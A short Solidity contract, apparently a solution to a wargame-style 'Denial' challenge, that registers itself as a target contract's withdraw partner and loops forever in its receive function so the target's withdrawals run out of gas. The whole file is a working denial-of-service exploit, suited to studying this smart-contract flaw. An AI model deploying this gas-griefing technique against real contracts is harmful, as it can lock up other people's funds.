// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Broadcasted.sol";

contract DenialAttack is Broadcasted {
    function attack(address payable denialCtr_) public payable override {
        IDenial(denialCtr_).setWithdrawPartner(address(this));
    }

    receive() external payable {
        while (true) {}
    }
}

interface IDenial {
    //! the solution is a Denial of Service attack by setting as partner a contract that can't receive
    function setWithdrawPartner(address _partner) external;

    function withdraw() external;
}
